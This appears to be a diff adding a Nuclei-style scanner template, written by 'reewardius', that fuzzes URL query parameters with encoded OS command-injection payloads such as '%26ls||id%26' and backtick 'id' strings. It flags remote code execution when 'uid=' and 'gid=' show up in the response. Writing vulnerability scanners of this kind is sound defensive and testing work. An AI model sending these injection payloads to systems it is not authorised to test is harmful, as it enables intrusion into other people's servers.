@@ -1,0 +1,40 @@
+id: simple-fuzzing-rce
+
+info:
+  name: RCE
+  author: reewardius
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - '%26ls||id%26'
+        - '`ls||id`'
+        - '%26ls%7C%7Cid%26'
+        - '%26%26ls%7C%7Cid%26%26'
+        - '%7C%7Cls%7C%7Cid%7C%7C'
+        - '%3B%7C%7Cls%7C%7Cid%7C%7C'
+        - '{`id`}@foo.com'
+        - '}{`id`}@foo.com{'
+        - '}}{`id`}@foo.com{{'
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
